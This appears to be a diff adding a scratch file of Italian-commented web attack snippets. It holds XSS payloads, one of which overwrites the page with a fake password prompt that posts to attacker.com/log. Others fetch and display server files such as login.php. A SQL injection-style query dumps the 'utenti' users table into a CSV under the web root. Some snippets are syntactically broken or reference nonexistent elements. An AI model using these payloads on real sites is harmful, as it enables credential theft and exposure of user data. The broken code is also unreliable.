@@ -1,0 +1,49 @@
+<SCRIPT>fetch('/var/www/html/').then(response => response.text()).then(data => document.body.innerHTML = data);</SCRIPT>
+<SCRIPT>document.body.innerHTML = '<h2>Reinserisci la tua password</h2><form action="https://attacker.com/log" method="POST"><input type="password" name="password"><button type="submit">Invia</button></form>';</SCRIPT>
+
+
+<input type="file" id="fileInput">
+<pre id="fileContent"></pre>
+
+<SCRIPT>
+document.getElementById('login.php').addEventListener('change', function(event) {
+    const file = event.target.files[0]; // Ottiene il file scelto
+    if (!file) return;
+
+    const reader = new FileReader();
+    reader.onload = function(e) {
+        document.getElementById('fileContent').textContent = e.target.result; // Mostra il contenuto
+    };
+    reader.readAsText(file); // Legge il file come testo
+});
+</SCRIPT>
+
+fetch('file.txt').then(response => response.text()).then(data => alert(data);}).catch(error => console.error('Errore nel caricamento del file:', error));
+
+<pre id="fileContent">Caricamento...</pre>
+
+<script>
+function caricaFile() {
+    fetch('file.txt') // Percorso del file
+    .then(response => response.text()) // Converte il file in testo
+    .then(data => {
+        document.getElementById('fileContent').textContent = data; // Mostra il contenuto
+    })
+    .catch(error => console.error('Errore nel caricamento del file:', error));
+}
+
+// Carica il file all'avvio
+caricaFile();
+
+// Aggiorna il file ogni 5 secondi
+setInterval(caricaFile, 5000);
+</script>
+
+<SCRIPT>function test(){fetch('login.php').then(response => response.text()).then(data => alert(data))}test();</SCRIPT>
+
+
+SELECT * FROM utenti 
+INTO OUTFILE '/var/www/html/TEST.csv'
+FIELDS TERMINATED BY ',' 
+ENCLOSED BY '"' 
+LINES TERMINATED BY '\n';
